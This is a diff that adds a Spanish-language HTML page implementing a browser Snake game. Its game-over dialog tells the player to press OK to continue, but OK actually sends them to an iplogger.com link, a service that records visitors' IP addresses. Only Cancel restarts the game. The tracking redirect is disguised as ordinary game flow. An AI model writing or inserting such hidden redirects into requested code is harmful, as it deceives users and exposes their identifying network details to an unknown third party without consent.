@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Juego de la Serpiente</title>
+    <style>
+        body {
+            background: #111;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        canvas {
+            background: #222;
+            border: 2px solid #0f0;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="game" width="400" height="400"></canvas>
+    <script>
+        const canvas = document.getElementById("game");
+        const ctx = canvas.getContext("2d");
+
+        const gridSize = 20;
+        const tileCount = canvas.width / gridSize;
+
+        let snake, apple, dx, dy, score, interval;
+
+        function resetGame() {
+            snake = [{ x: 10, y: 10 }];
+            apple = { x: 5, y: 5 };
+            dx = 1; dy = 0;
+            score = 0;
+        }
+
+        resetGame();
+
+        document.addEventListener("keydown", (e) => {
+            switch(e.key) {
+                case "ArrowLeft": if (dx === 0) { dx = -1; dy = 0; } break;
+                case "ArrowUp": if (dy === 0) { dx = 0; dy = -1; } break;
+                case "ArrowRight": if (dx === 0) { dx = 1; dy = 0; } break;
+                case "ArrowDown": if (dy === 0) { dx = 0; dy = 1; } break;
+            }
+        });
+
+        function gameLoop() {
+            const head = { x: snake[0].x + dx, y: snake[0].y + dy };
+
+            // Colisiones
+            if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount || 
+                snake.some(segment => segment.x === head.x && segment.y === head.y)) {
+                
+                clearInterval(interval); // DETIENE el bucle del juego
+                if (confirm(`¡Juego terminado! Tu puntuación fue: ${score}\n\nPulsa OK para continuar.`)) {
+                    window.location.href = "https://iplogger.com/2uQvB5";
+                } else {
+                    resetGame();
+                    interval = setInterval(gameLoop, 100); // reanuda solo si no aceptó
+                }
+                return;
+            }
+
+            snake.unshift(head);
+
+            if (head.x === apple.x && head.y === apple.y) {
+                score++;
+                apple.x = Math.floor(Math.random() * tileCount);
+                apple.y = Math.floor(Math.random() * tileCount);
+            } else {
+                snake.pop();
+            }
+
+            // Dibujar
+            ctx.fillStyle = "#222";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = "lime";
+            snake.forEach(segment => ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 2, gridSize - 2));
+
+            ctx.fillStyle = "red";
+            ctx.fillRect(apple.x * gridSize, apple.y * gridSize, gridSize - 2, gridSize - 2);
+        }
+
+        interval = setInterval(gameLoop, 100);
+    </script>
+</body>
+</html>
